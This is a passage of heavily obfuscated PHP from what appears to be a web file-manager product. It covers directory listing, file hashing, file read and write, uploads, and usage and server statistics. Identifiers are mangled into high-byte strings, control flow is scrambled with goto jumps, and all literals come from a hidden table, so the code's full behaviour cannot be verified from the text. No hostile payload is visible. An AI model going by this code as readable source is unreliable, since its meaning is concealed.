$FÙ‹öÅêÑŸ =& $_SERVER[õëù©û]; $fñÁ†´ğ© = $this->iconvSystem($fñÁ†´ğ©); $fñÁ†´ğ© = rtrim($fñÁ†´ğ©, $FÙ‹öÅêÑŸ[8]) . $FÙ‹öÅêÑŸ[8]; goto E¹Ú¼ˆ¿áÏ; a§ ­‹æŒÕ: closedir($B›Ÿªëšò); return $c¯ÖÒïİ™è; goto dáøŸˆùåí; E¹Ú¼ˆ¿áÏ: $c¯ÖÒïİ™è = array($FÙ‹öÅêÑŸ[74] => array(), $FÙ‹öÅêÑŸ[73] => array()); if (!($B›Ÿªëšò = @opendir($fñÁ†´ğ©))) { return $c¯ÖÒïİ™è; } while (($CÙ•ÇÁã…¼ = readdir($B›Ÿªëšò)) !== !1) { if ($CÙ•ÇÁã…¼ == $FÙ‹öÅêÑŸ[91] || $CÙ•ÇÁã…¼ == $FÙ‹öÅêÑŸ[1148]) { continue; } $B•ÄèµÇ‘­ = $fñÁ†´ğ© . $CÙ•ÇÁã…¼; if (is_file($B•ÄèµÇ‘­)) { $c¯ÖÒïİ™è[$FÙ‹öÅêÑŸ[73]][] = $this->fileInfo($B•ÄèµÇ‘­, $bçÊç¤Ò·ò); } else { $c¯ÖÒïİ™è[$FÙ‹öÅêÑŸ[74]][] = $this->folderInfo($B•ÄèµÇ‘­, $bçÊç¤Ò·ò); } } goto a§ ­‹æŒÕ; dáøŸˆùåí: } public function listAll($aÅ’ê³Ìº¦, &$bæ÷¯ùæ˜ = array()) { goto b“ë¢Ğâ; F¹êƒ›äÊ»: return $bæ÷¯ùæ˜; goto fØ“”˜¶¦ä; b“ë¢Ğâ: $cóğÚ–†Â² =& $_SERVER[õëù©û]; $aÅ’ê³Ìº¦ = $this->iconvSystem($aÅ’ê³Ìº¦); $aÅ’ê³Ìº¦ = rtrim($aÅ’ê³Ìº¦, $cóğÚ–†Â²[8]) . $cóğÚ–†Â²[8]; goto B©§ô«ö´‰; B©§ô«ö´‰: if (!($f–¤…áó… = @opendir($aÅ’ê³Ìº¦))) { return $bæ÷¯ùæ˜; } while (($cÈÊÏê¹Ö = readdir($f–¤…áó…)) !== !1) { if ($cÈÊÏê¹Ö == $cóğÚ–†Â²[91] || $cÈÊÏê¹Ö == $cóğÚ–†Â²[1148]) { continue; } $a¨ùŸÄ¹ø¸ = $aÅ’ê³Ìº¦ . $cÈÊÏê¹Ö; if (is_dir($a¨ùŸÄ¹ø¸)) { $bæ÷¯ùæ˜[] = array($cóğÚ–†Â²[75] => $a¨ùŸÄ¹ø¸ . $cóğÚ–†Â²[8], $cóğÚ–†Â²[76] => 1, $cóğÚ–†Â²[106] => @filemtime($a¨ùŸÄ¹ø¸), $cóğÚ–†Â²[77] => 0); $this->listAll($a¨ùŸÄ¹ø¸, $bæ÷¯ùæ˜); } else { $bæ÷¯ùæ˜[] = array($cóğÚ–†Â²[75] => $a¨ùŸÄ¹ø¸, $cóğÚ–†Â²[76] => 0, $cóğÚ–†Â²[106] => @filemtime($a¨ùŸÄ¹ø¸), $cóğÚ–†Â²[77] => $this->size($a¨ùŸÄ¹ø¸)); } } closedir($f–¤…áó…); goto F¹êƒ›äÊ»; fØ“”˜¶¦ä: } public function has($b™¨¦áã“¸, $F–êÎŒ¦¤À = false, $DƒÁ‰Ù‘ = true) { goto dÎ±„¯œæ„; CÜ×¸ÁĞĞ: if (!($BÑ‘Ñ„ïÅİ = @opendir($b™¨¦áã“¸))) { return !1; } $CåÎºîã = 0; $Cè“¼´Ô’ê = 0; goto c–°—´”Çï; d…ã°ÎÍñ›: return !1; goto b­‡©—Àù±; c–°—´”Çï: while (($cİš±²øå² = readdir($BÑ‘Ñ„ïÅİ)) !== !1) { if ($cİš±²øå² == $bÁ®µõ‰ç›[91] || $cİš±²øå² == $bÁ®µõ‰ç›[1148]) { continue; } $A«Ş«¤íé‰ = $b™¨¦áã“¸ . $cİš±²øå²; if ($F–êÎŒ¦¤À) { if (@is_file($A«Ş«¤íé‰)) { $CåÎºîã++; } else { $Cè“¼´Ô’ê++; } continue; } if ($DƒÁ‰Ù‘) { if (@is_file($A«Ş«¤íé‰)) { return !0; } } else { if (@is_dir($A«Ş«¤íé‰ . $bÁ®µõ‰ç›[8])) { return !0; } } } closedir($BÑ‘Ñ„ïÅİ); if ($F–êÎŒ¦¤À) { return array($bÁ®µõ‰ç›[187] => $CåÎºîã, $bÁ®µõ‰ç›[188] => $Cè“¼´Ô’ê); } goto d…ã°ÎÍñ›; dÎ±„¯œæ„: $bÁ®µõ‰ç› =& $_SERVER[õëù©û]; $b™¨¦áã“¸ = $this->iconvSystem($b™¨¦áã“¸); $b™¨¦áã“¸ = rtrim($b™¨¦áã“¸, $bÁ®µõ‰ç›[8]) . $bÁ®µõ‰ç›[8]; goto CÜ×¸ÁĞĞ; b­‡©—Àù±: } public function hashSimple($càÉòî×) { goto dÚµçğ„¶; CãÒã§ôï: return md5($e¹…›·ÏØ®) . $dË† Ì‘–Ä; goto BÉé¾•­Éá; C¯Ë¦Èº²: fseek($F–×× ¾ÍÜ, $dË† Ì‘–Ä - $c¤ÀòâøÃ³); $e¹…›·ÏØ® .= fread($F–×× ¾ÍÜ, $c¤ÀòâøÃ³); fclose($F–×× ¾ÍÜ); goto CãÒã§ôï; dÚµçğ„¶: $A˜ˆóßŸÏ =& $_SERVER[õëù©û]; if (!$càÉòî×) { return md5($A˜ˆóßŸÏ[33]); } $càÉòî× = $this->iconvSystem($càÉòî×); goto DçÙ·±‹ãä; e¶°ßß¦´ò: if ($dË† Ì‘–Ä <= $c¤ÀòâøÃ³ * $f°ê³ÇÏİ¡) { return $this->hashMd5($càÉòî×) . $dË† Ì‘–Ä; } $e¹…›·ÏØ® = $A˜ˆóßŸÏ[33]; $aŒ¹ÏÌ®”† = intval($dË† Ì‘–Ä / $f°ê³ÇÏİ¡); goto dí–…†½·¯; dí–…†½·¯: $F–×× ¾ÍÜ = fopen($càÉòî×, $A˜ˆóßŸÏ[1153]); if (!$F–×× ¾ÍÜ) { return $e¹…›·ÏØ®; } for ($B‹ĞÇÇ‚¹ = 0; $B‹ĞÇÇ‚¹ < $f°ê³ÇÏİ¡; $B‹ĞÇÇ‚¹++) { fseek($F–×× ¾ÍÜ, $aŒ¹ÏÌ®”† * $B‹ĞÇÇ‚¹); $e¹…›·ÏØ® .= fread($F–×× ¾ÍÜ, $c¤ÀòâøÃ³); } goto C¯Ë¦Èº²; DçÙ·±‹ãä: $dË† Ì‘–Ä = $this->size($càÉòî×); $c¤ÀòâøÃ³ = 200; $f°ê³ÇÏİ¡ = 50; goto e¶°ßß¦´ò; BÉé¾•­Éá: } public function getContent($d®‚¿ºíå) { $d®‚¿ºíå = $this->iconvSystem($d®‚¿ºíå); return file_get_contents($d®‚¿ºíå); } public function setContent($dˆ”ŞÆ™, $CÑ„¯•ÉñÏ = '') { $dˆ”ŞÆ™ = $this->iconvSystem($dˆ”ŞÆ™); @file_put_contents($dˆ”ŞÆ™, $CÑ„¯•ÉñÏ, LOCK_EX); clearstatcache(); return strlen($CÑ„¯•ÉñÏ) == filesize($dˆ”ŞÆ™); } public function fileSubstr($BÌÚ¦›æß§, $d£¡â‰‰¾­ = 0, $b®ø™¦›óÆ = false) { goto DÌù®¸®¾á; bõ‘£ ãìš: if ($b®ø™¦›óÆ <= 0) { return $cê¡§ŒÈØî[33]; } $A‘šËâñ† = fopen($BÌÚ¦›æß§, $cê¡§ŒÈØî[1153]); if (!$A‘šËâñ†) { return !1; } goto D†¤»‰†¯; DÊÕ¢›Ì: return $A‚ÆÆÕ×•; goto BÊ·¼´ÅµÍ; D†¤»‰†¯: fseek($A‘šËâñ†, $d£¡â‰‰¾­); $A‚ÆÆÕ×• = fread($A‘šËâñ†, $b®ø™¦›óÆ); fclose($A‘šËâñ†); goto DÊÕ¢›Ì; DÌù®¸®¾á: $cê¡§ŒÈØî =& $_SERVER[õëù©û]; $BÌÚ¦›æß§ = $this->iconvSystem($BÌÚ¦›æß§); if ($b®ø™¦›óÆ === !1) { $b®ø™¦›óÆ = $this->size($BÌÚ¦›æß§); } goto bõ‘£ ãìš; BÊ·¼´ÅµÍ: } public function upload($C…Ó‡£Èíæ, $A‚ÒĞÔÔ†Ò, $b‚å‘¯í¹ë = false, $Eˆäƒà©‚¿ = REPEAT_REPLACE) { $då…ƒ…“ÔÕ = $this->copyFile($A‚ÒĞÔÔ†Ò, $C…Ó‡£Èíæ); return $då…ƒ…“ÔÕ ? $this->getPathOuter($C…Ó‡£Èíæ) : !1; } public function download($BÕ¹ªËš¬Û, $d¾ÊÚõáº“) { return $this->iconvSystem($BÕ¹ªËš¬Û); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($B¡İ¡èÅòÒ) { parent::__construct($B¡İ¡èÅòÒ); $this->signatureVersion($_SERVER[õëù©û][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto eî‰¸‘ˆÈ; A¬í¯ğ´àÊ: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($fëˆÖÑ‰Ì™) { $D™ÏÀÙó¹  =& $_SERVER[õëù©û]; $fÖŒ¬°‚İ’ = array($D™ÏÀÙó¹ [530] => array($D™ÏÀÙó¹ [29] => $D™ÏÀÙó¹ [1994], $D™ÏÀÙó¹ [257] => array($D™ÏÀÙó¹ [206], $D™ÏÀÙó¹ [695], $D™ÏÀÙó¹ [1995], $D™ÏÀÙó¹ [1996])), $D™ÏÀÙó¹ [1997] => array($D™ÏÀÙó¹ [29] => $D™ÏÀÙó¹ [1998], $D™ÏÀÙó¹ [257] => array($D™ÏÀÙó¹ [206], $D™ÏÀÙó¹ [693], $D™ÏÀÙó¹ [1999], $D™ÏÀÙó¹ [2000], $D™ÏÀÙó¹ [2001]))); if (!isset($fÖŒ¬°‚İ’[$fëˆÖÑ‰Ì™])) { return !1; } $this->optionType = $fÖŒ¬°‚İ’[$fëˆÖÑ‰Ì™][$D™ÏÀÙó¹ [29]]; $this->field = $fÖŒ¬°‚İ’[$fëˆÖÑ‰Ì™][$D™ÏÀÙó¹ [257]]; return !0; } public function listData($dËåÔÔŞÎ– = false, $A“”¹§Şˆö = "\x6d\157\144\151\x66\x79\x54\151\x6d\x65", $e®º²°ïçÃ = false) { return parent::listData($dËåÔÔŞÎ–, $A“”¹§Şˆö, $e®º²°ïçÃ); } public function trendList($A‚±ŸŞÀñ) { goto cÀÆØœÙ“º; cÀÆØœÙ“º: $c¸Ë§ÄâŒË =& $_SERVER[õëù©û]; $cÌøÃ©Øğ = $this->listData(); if ($cÌøÃ©Øğ) { $D¡çÏÑÛËõ = end($cÌøÃ©Øğ); $cß×Åˆğˆš = date($c¸Ë§ÄâŒË[2002], strtotime($c¸Ë§ÄâŒË[2003])); if ($D¡çÏÑÛËõ[$c¸Ë§ÄâŒË[206]] == $cß×Åˆğˆš) { return $cÌøÃ©Øğ; } $Eï»ÍÄ´ø± = strtotime($D¡çÏÑÛËõ[$c¸Ë§ÄâŒË[206]]); } goto B„ƒ±—‡Ïí; B„ƒ±—‡Ïí: if (!isset($Eï»ÍÄ´ø±)) { $dßöòÊÔĞ« = $A‚±ŸŞÀñ == $c¸Ë§ÄâŒË[530] ? $c¸Ë§ÄâŒË[472] : $c¸Ë§ÄâŒË[747]; $Eï»ÍÄ´ø± = Model($dßöòÊÔĞ«)->min($c¸Ë§ÄâŒË[183]); } $E…ªàï‘‹ø = $c¸Ë§ÄâŒË[2004] . ucfirst($A‚±ŸŞÀñ); $d•÷’é§ÁÖ = $this->dateList($Eï»ÍÄ´ø±); goto A·ø±ù©‹š; A·ø±ù©‹š: foreach ($d•÷’é§ÁÖ as $cß×Åˆğˆš) { $this->{$E…ªàï‘‹ø}($cß×Åˆğˆš); } return $this->listData(); goto FĞêˆ·Î„; FĞêˆ·Î„: } private function dateList($Dõ ˜ÂÄ×) { $eùËÛ‰÷¸Í =& $_SERVER[õëù©û]; $e¥ÈÙÜïìë = $Dõ ˜ÂÄ×; $B·…»ŸÁÕ” = strtotime($eùËÛ‰÷¸Í[2003]); $d¨ôÖÅ©­ = array(); while ($e¥ÈÙÜïìë <= $B·…»ŸÁÕ”) { $d¨ôÖÅ©­[] = date($eùËÛ‰÷¸Í[2002], $e¥ÈÙÜïìë); $e¥ÈÙÜïìë = strtotime($eùËÛ‰÷¸Í[2005], $e¥ÈÙÜïìë); } return $d¨ôÖÅ©­; } public function _recordUser($c¢í÷”ÀŸ¿ = '') { goto b‚‚ù—Á·„; b‚‚ù—Á·„: $dÖ ×ˆÙ×— =& $_SERVER[õëù©û]; $CÎÛòĞ‰Á¿ = strtotime(date($dÖ ×ˆÙ×—[2006], strtotime($c¢í÷”ÀŸ¿))); $E‚™Ü³Â·¨ = strtotime(date($dÖ ×ˆÙ×—[2007], strtotime($c¢í÷”ÀŸ¿))); goto a‰ùÑÇÕ‚›; b‡¬·ñ¨•‡: $B»¿ÙŸõòö = Model($dÖ ×ˆÙ×—[472])->where($fâŒ¼ë¢Ñ)->count($dÖ ×ˆÙ×—[1404]); $fâŒ¼ë¢Ñ[$dÖ ×ˆÙ×—[29]] = $dÖ ×ˆÙ×—[2008]; $FÏÆÙòÌŞñ = Model($dÖ ×ˆÙ×—[2009])->where($fâŒ¼ë¢Ñ)->count($dÖ ×ˆÙ×—[2010]); goto Aó›®ŒÀ¾ò; Aó›®ŒÀ¾ò: $DÉ·‹—¹İÛ = array($dÖ ×ˆÙ×—[206] => $c¢í÷”ÀŸ¿, $dÖ ×ˆÙ×—[695] => (int) $eµØ˜Ø£Ğù, $dÖ ×ˆÙ×—[1995] => (int) $B»¿ÙŸõòö, $dÖ ×ˆÙ×—[1996] => (int) $FÏÆÙòÌŞñ); return $this->insert($DÉ·‹—¹İÛ); goto bÁ¼ù‚«ê; a‰ùÑÇÕ‚›: $fâŒ¼ë¢Ñ = array($dÖ ×ˆÙ×—[183] => array($dÖ ×ˆÙ×—[920], $E‚™Ü³Â·¨)); $eµØ˜Ø£Ğù = Model($dÖ ×ˆÙ×—[472])->where($fâŒ¼ë¢Ñ)->count($dÖ ×ˆÙ×—[1404]); $fâŒ¼ë¢Ñ[$dÖ ×ˆÙ×—[183]] = array($dÖ ×ˆÙ×—[317], array($CÎÛòĞ‰Á¿, $E‚™Ü³Â·¨)); goto b‡¬·ñ¨•‡; bÁ¼ù‚«ê: } public function _recordStore($cö§Ñï—† = '') { goto c¿ğèÇæê; c¿ğèÇæê: $C™Õõë®àõ =& $_SERVER[õëù©û]; $D·ÆÎ¹ïø = strtotime(date($C™Õõë®àõ[2007], strtotime($cö§Ñï—†))); $C¥çë°±Çë = array($C™Õõë®àõ[183] => array($C™Õõë®àõ[920], $D·ÆÎ¹ïø)); goto Eì’”§‡æç; b—‘Ë›çÈİ: $C¥çë°±Çë[$C™Õõë®àõ[367]] = 1; $CÓ•×Ñ¤Ğ = Model($C™Õõë®àõ[747])->where($C¥çë°±Çë)->sum($C™Õõë®àõ[77]); $C¥çë°±Çë[$C™Õõë®àõ[367]] = 2; goto EÓ’áŒˆù; Eì’”§‡æç: $då…¥À´ = Model($C™Õõë®àõ[417])->where($C¥çë°±Çë)->sum($C™Õõë®àõ[77]); $C¥çë°±Çë[$C™Õõë®àõ[366]] = 0; $fÉÓéôªß¼ = Model($C™Õõë®àõ[747])->where($C¥çë°±Çë)->sum($C™Õõë®àõ[77]); goto b—‘Ë›çÈİ; EÓ’áŒˆù: $bÁì¬Œ÷¢‹ = Model($C™Õõë®àõ[747])->where($C¥çë°±Çë)->sum($C™Õõë®àõ[77]); $F¶“¢¸Øõ† = array($C™Õõë®àõ[206] => $cö§Ñï—†, $C™Õõë®àõ[693] => (int) $fÉÓéôªß¼, $C™Õõë®àõ[1999] => (int) $då…¥À´, $C™Õõë®àõ[2000] => (int) $CÓ•×Ñ¤Ğ, $C™Õõë®àõ[2001] => (int) $bÁì¬Œ÷¢‹); return $this->insert($F¶“¢¸Øõ†); goto dê‰¼…‰Ê›; dê‰¼…‰Ê›: } public function trend($a—ì’’¯¼ì, $D²ó‘Í¾²Ï) { goto C‹§£¼‰îß; D‹‰¦êì÷Ù: if (empty($C™É–¨òÊ¶)) { $có¡¼ø‰ší = date($D­“Óùô‡[2002], strtotime($D­“Óùô‡[2003])); $c²Ñó“–è = array($D­“Óùô‡[206] => $có¡¼ø‰ší); foreach ($fî‚»äƒ [$a—ì’’¯¼ì] as $d®¯Øôöç° => $Dù½ÅÉ¿›¾) { $c²Ñó“–è[$d®¯Øôöç°] = 0; } $C™É–¨òÊ¶[] = $c²Ñó“–è; } $Aë±Š˜‡ô’ = array(); foreach ($C™É–¨òÊ¶ as $Dù½ÅÉ¿›¾) { if ($a—ì’’¯¼ì == $D­“Óùô‡[1997] && $Dù½ÅÉ¿›¾[$D­“Óùô‡[1999]] > $Dù½ÅÉ¿›¾[$D­“Óùô‡[693]]) { $Dù½ÅÉ¿›¾[$D­“Óùô‡[1999]] = $Dù½ÅÉ¿›¾[$D­“Óùô‡[693]]; } foreach ($fî‚»äƒ [$a—ì’’¯¼ì] as $d®¯Øôöç° => $f„…›Ø¡‰¹) { $c–µèİì¶Ï = array($D­“Óùô‡[206] => $Dù½ÅÉ¿›¾[$D­“Óùô‡[206]], $D­“Óùô‡[1310] => $f„…›Ø¡‰¹); $c–µèİì¶Ï[$cİÂ¥Õ›©[$a—ì’’¯¼ì]] = isset($Dù½ÅÉ¿›¾[$d®¯Øôöç°]) ? $Dù½ÅÉ¿›¾[$d®¯Øôöç°] : 0; $Aë±Š˜‡ô’[] = $c–µèİì¶Ï; } } goto c²¨±ïßí; EŸôÎèÊ¼Í: if ($C™É–¨òÊ¶ && $D²ó‘Í¾²Ï != $D­“Óùô‡[1379]) { $EäÛâòš÷ = $C™É–¨òÊ¶[0][$D­“Óùô‡[206]]; $cäíÁÃ«‹¸ = $this->validDate($D²ó‘Í¾²Ï, $EäÛâòš÷); $aÕé”İÃ«â = array(); $eœ™‘›Úñ• = array_to_keyvalue($C™É–¨òÊ¶, $D­“Óùô‡[206]); foreach ($cäíÁÃ«‹¸ as $có¡¼ø‰ší) { if (isset($eœ™‘›Úñ•[$có¡¼ø‰ší])) { $c–µèİì¶Ï = $eœ™‘›Úñ•[$có¡¼ø‰ší]; } else { $c–µèİì¶Ï = end($C™É–¨òÊ¶); $c–µèİì¶Ï[$D­“Óùô‡[206]] = $có¡¼ø‰ší; if ($a—ì’’¯¼ì == $D­“Óùô‡[530]) { $c–µèİì¶Ï[$D­“Óùô‡[1995]] = $c–µèİì¶Ï[$D­“Óùô‡[1996]] = 0; } } $aÕé”İÃ«â[] = $c–µèİì¶Ï; } $C™É–¨òÊ¶ = $aÕé”İÃ«â; } $fî‚»äƒ  = array($D­“Óùô‡[530] => array($D­“Óùô‡[695] => LNG($D­“Óùô‡[2011]), $D­“Óùô‡[1995] => LNG($D­“Óùô‡[2012]), $D­“Óùô‡[1996] => LNG($D­“Óùô‡[2013])), $D­“Óùô‡[1997] => array($D­“Óùô‡[693] => LNG($D­“Óùô‡[2014]), $D­“Óùô‡[1999] => LNG($D­“Óùô‡[2015]), $D­“Óùô‡[2000] => LNG($D­“Óùô‡[2016]), $D­“Óùô‡[2001] => LNG($D­“Óùô‡[2017]))); $cİÂ¥Õ›© = array($D­“Óùô‡[530] => $D­“Óùô‡[2018], $D­“Óùô‡[1997] => $D­“Óùô‡[77]); goto D‹‰¦êì÷Ù; C‹§£¼‰îß: $D­“Óùô‡ =& $_SERVER[õëù©û]; if (!$this->init($a—ì’’¯¼ì)) { return !1; } $C™É–¨òÊ¶ = $this->trendList($a—ì’’¯¼ì); goto EŸôÎèÊ¼Í; c²¨±ïßí: return $Aë±Š˜‡ô’; goto b‡èÑÙí‡; b‡èÑÙí‡: } public function validDate($a£ÀËˆŒéˆ, $A¡‘ÀŠƒğÖ) { goto fáÃˆ…ÂÆƒ; f„§¨ç’›œ: return $D–…§øš‘å; goto Bè³âª‚¿ç; fáÃˆ…ÂÆƒ: $eªØ—¨áªÑ =& $_SERVER[õëù©û]; $Döğ”ˆ†£… = date($eªØ—¨áªÑ[2002], strtotime($eªØ—¨áªÑ[2003])); $D–…§øš‘å = array($Döğ”ˆ†£…); goto aè£™Ö…Í; aè£™Ö…Í: switch ($a£ÀËˆŒéˆ) { case $eªØ—¨áªÑ[1386]: $c†Î¨à÷‡ = mktime(0, 0, 0, date($eªØ—¨áªÑ[2019]), date($eªØ—¨áªÑ[2020]) - date($eªØ—¨áªÑ[1209]) + 7 - 7, date($eªØ—¨áªÑ[2021])); $a‡ÓóĞ™¯ = 0; do { $DÓ÷»—Èêª = date($eªØ—¨áªÑ[2002], $c†Î¨à÷‡ - 3600 * 24 * 7 * $a‡ÓóĞ™¯); $D–…§øš‘å[] = $DÓ÷»—Èêª; $a‡ÓóĞ™¯++; } while ($A¡‘ÀŠƒğÖ < $DÓ÷»—Èêª); break; case $eªØ—¨áªÑ[1384]: $a‡ÓóĞ™¯ = 1; do { $f¤‹‚é‡¼± = date($eªØ—¨áªÑ[2022], strtotime("\55\x20{$a‡ÓóĞ™¯}\40\155\157\156\164\x68\x73")); $D–…§øš‘å[] = $f¤‹‚é‡¼±; $a‡ÓóĞ™¯++; } while ($A¡‘ÀŠƒğÖ < $f¤‹‚é‡¼±); break; case $eªØ—¨áªÑ[1690]: $FæÙˆÈ‚ = (int) date($eªØ—¨áªÑ[2021], strtotime($A¡‘ÀŠƒğÖ)); $F¦¡„ˆ¦Á÷ = (int) date($eªØ—¨áªÑ[2021]); if ($FæÙˆÈ‚ >= $F¦¡„ˆ¦Á÷) { break; } for ($FæÙˆÈ‚; $FæÙˆÈ‚ < $F¦¡„ˆ¦Á÷; $FæÙˆÈ‚++) { $D–…§øš‘å[] = $FæÙˆÈ‚ . $eªØ—¨áªÑ[2023]; } break; default: break; } if ($A¡‘ÀŠƒğÖ > end($D–…§øš‘å)) { array_pop($D–…§øš‘å); } sort($D–…§øš‘å); goto f„§¨ç’›œ; Bè³âª‚¿ç: } public function listTable($dä»à›¢‹) { $FÕœÃ»Ú¯Ù = ucfirst($dä»à›¢‹); return Model($FÕœÃ»Ú¯Ù)->listData(); } public function option($B¥…¢é’Ôğ) { $Cõ´­îæ‹Ì = $_SERVER[õëù©û][2024] . ucfirst($B¥…¢é’Ôğ); return $this->{$Cõ´­îæ‹Ì}(); } private function optionUser() { goto A‘¼‚Š»ƒ; dÂå‘¹šÜ: $d¸ŸÄİ³ÌŒ = strtotime($A©“Ô‡¼“«[2026]); $A¢ƒ’ÄğŒ = array($A©“Ô‡¼“«[2027] => array($A©“Ô‡¼“«[921], $d¸ŸÄİ³ÌŒ)); $dÕ±¼À‘¡ = (int) Model($A©“Ô‡¼“«[472])->where($A¢ƒ’ÄğŒ)->count($A©“Ô‡¼“«[1404]); goto f®±Ì½Æñ; f®±Ì½Æñ: if (!$dÕ±¼À‘¡) { $dÕ±¼À‘¡ = 1; } $d¸ŸÄİ³ÌŒ = strtotime(date($A©“Ô‡¼“«[2006])); $A¢ƒ’ÄğŒ = array($A©“Ô‡¼“«[2027] => array($A©“Ô‡¼“«[921], $d¸ŸÄİ³ÌŒ)); goto Cà‚ê×²èê; Cà‚ê×²èê: $eÕøÀ—¨® = Model($A©“Ô‡¼“«[472])->where($A¢ƒ’ÄğŒ)->count($A©“Ô‡¼“«[1404]); return array($A©“Ô‡¼“«[690] => (int) $fàÅî¯½Á, $A©“Ô‡¼“«[2028] => (int) ($fàÅî¯½Á - $a¨èŞİÇœí), $A©“Ô‡¼“«[2029] => (int) $a¨èŞİÇœí, $A©“Ô‡¼“«[2030] => (int) $eÕøÀ—¨®, $A©“Ô‡¼“«[2031] => $dÕ±¼À‘¡); goto fÉ¦‰Ë³×; A‘¼‚Š»ƒ: $A©“Ô‡¼“« =& $_SERVER[õëù©û]; $fàÅî¯½Á = Model($A©“Ô‡¼“«[472])->count($A©“Ô‡¼“«[1404]); $a¨èŞİÇœí = Model($A©“Ô‡¼“«[472])->where($A©“Ô‡¼“«[2025])->count($A©“Ô‡¼“«[1404]); goto dÂå‘¹šÜ; fÉ¦‰Ë³×: } private function optionFile() { goto d“ÙíÌ¸ùÙ; có¨¹ƒÓˆØ: $e‡ÍÒéÚ = Model($B™™‰ŸŒÒí[747])->where($EÍØƒÅ‚)->sum($B™™‰ŸŒÒí[77]); $d²êì¼ÜÇå = Model($B™™‰ŸŒÒí[747])->where($EÍØƒÅ‚)->count($B™™‰ŸŒÒí[365]); return array($B™™‰ŸŒÒí[693] => $Eí¼‰åŸŞ™, $B™™‰ŸŒÒí[1999] => $f·Õ¨òïÉÈ, $B™™‰ŸŒÒí[2032] => $Eí¼‰åŸŞ™ - $f·Õ¨òïÉÈ, $B™™‰ŸŒÒí[2033] => (int) $e‡ÍÒéÚ, $B™™‰ŸŒÒí[695] => (int) $A©ä÷İ…ó·, $B™™‰ŸŒÒí[2034] => (int) $d²êì¼ÜÇå); goto D¿ÑƒÍä½‰; d“ÙíÌ¸ùÙ: $B™™‰ŸŒÒí =& $_SERVER[õëù©û]; $C’™ø×½Ã´ = $this->sourceSize(); $Eí¼‰åŸŞ™ = $C’™ø×½Ã´[$B™™‰ŸŒÒí[77]]; goto c„ÁÖ«ëçá; c„ÁÖ«ëçá: $f·Õ¨òïÉÈ = $C’™ø×½Ã´[$B™™‰ŸŒÒí[1999]]; $A©ä÷İ…ó· = Model($B™™‰ŸŒÒí[747])->where(array($B™™‰ŸŒÒí[366] => 0))->count($B™™‰ŸŒÒí[365]); $EÍØƒÅ‚ = array($B™™‰ŸŒÒí[366] => 0, $B™™‰ŸŒÒí[183] => array($B™™‰ŸŒÒí[921], strtotime(date($B™™‰ŸŒÒí[2006])))); goto có¨¹ƒÓˆØ; D¿ÑƒÍä½‰: } private function optionAccess() { $c“‡¬¢ ¿‚ =& $_SERVER[õëù©û]; return array($c“‡¬¢ ¿‚[690] => $this->typeLogCnt(), $c“‡¬¢ ¿‚[102] => $this->typeLogCnt($c“‡¬¢ ¿‚[102]), $c“‡¬¢ ¿‚[399] => $this->typeLogCnt($c“‡¬¢ ¿‚[399]), $c“‡¬¢ ¿‚[2035] => $this->typeLogCnt($c“‡¬¢ ¿‚[2035]), $c“‡¬¢ ¿‚[2036] => $this->typeLogCnt($c“‡¬¢ ¿‚[2036]), $c“‡¬¢ ¿‚[530] => $this->typeLogCnt($c“‡¬¢ ¿‚[33], $c“‡¬¢ ¿‚[2010])); } private function typeLogCnt($C‚‰Êº°‡å = '', $b–¿â»ç´ = "\151\x64") { goto EÄîİ¨‡²ô; Bíè‹•£­Ô: $DÌ½çñô£ = array($bÎÜ™Ç¡ö[183] => array($bÎÜ™Ç¡ö[921], $A¿ã˜·ñ¡è)); if ($C‚‰Êº°‡å) { $DÌ½çñô£[$bÎÜ™Ç¡ö[29]] = array($bÎÜ™Ç¡ö[7], $DìË–ä…¯ñ[$C‚‰Êº°‡å]); } $C™šå¦‘ñ¾ = Model($bÎÜ™Ç¡ö[2009])->where($DÌ½çñô£)->count($b–¿â»ç´); goto E¤˜ø£½áè; E¤˜ø£½áè: return (int) $C™šå¦‘ñ¾; goto aÊß…•ô©º; EÄîİ¨‡²ô: $bÎÜ™Ç¡ö =& $_SERVER[õëù©û]; $DìË–ä…¯ñ = array($bÎÜ™Ç¡ö[102] => array($bÎÜ™Ç¡ö[2037], $bÎÜ™Ç¡ö[2038]), $bÎÜ™Ç¡ö[399] => array($bÎÜ™Ç¡ö[2039], $bÎÜ™Ç¡ö[2040]), $bÎÜ™Ç¡ö[2035] => array($bÎÜ™Ç¡ö[2041], $bÎÜ™Ç¡ö[2042]), $bÎÜ™Ç¡ö[2036] => array($bÎÜ™Ç¡ö[2043], $bÎÜ™Ç¡ö[2044]), $bÎÜ™Ç¡ö[2045] => array($bÎÜ™Ç¡ö[2046], $bÎÜ™Ç¡ö[2047], $bÎÜ™Ç¡ö[2048])); $A¿ã˜·ñ¡è = strtotime(date($bÎÜ™Ç¡ö[2006])); goto Bíè‹•£­Ô; aÊß…•ô©º: } private function optionServer() { goto bÏĞ¸³¢È; bÏĞ¸³¢È: $açåôÓï· =& $_SERVER[õëù©û]; $f±õ‡ãßÃ… = $this->diskDriver(); $DÆ†Œçš‚è = KodIO::defaultDriver(); goto eß²ÒÙñáÔ; eß²ÒÙñáÔ: $Cò³ãŒöî = array($açåôÓï·[738] => $DÆ†Œçš‚è[$açåôÓï·[363]]); $C‡¢ßÓ„ŠÑ = Model($açåôÓï·[417])->where($Cò³ãŒöî)->sum($açåôÓï·[77]); $bÄöÅ”Õñº = explode($açåôÓï·[50], $_SERVER[$açåôÓï·[137]]); goto F¢—Öù®œ; F¢—Öù®œ: $EËÇƒ×İî = $bÄöÅ”Õñº[0]; $b‡›’Ş¾§ = $GLOBALS[$açåôÓï·[6]][$açåôÓï·[17]]; $fáË½ğ´ùå = $b‡›’Ş¾§[$açåôÓï·[881]]; goto AÂì‘ÁÀ¤ö; Få´ñ¶ŞÉ: return array($açåôÓï·[2051] => $f±õ‡ãßÃ… ? $f±õ‡ãßÃ…[$açåôÓï·[2052]] : 0, $açåôÓï·[2053] => $f±õ‡ãßÃ… ? $f±õ‡ãßÃ…[$açåôÓï·[2054]] : 0, $açåôÓï·[2055] => (int) $DÆ†Œçš‚è[$açåôÓï·[2052]] * 1024 * 1024 * 1024, $açåôÓï·[2056] => (int) $C‡¢ßÓ„ŠÑ, $açåôÓï·[2057] => ucfirst($EËÇƒ×İî), $açåôÓï·[2058] => $açåôÓï·[2059] . PHP_VERSION, $açåôÓï·[2060] => phpBuild64() ? 64 : 32, $açåôÓï·[689] => str_replace($açåôÓï·[2061], $açåôÓï·[897], 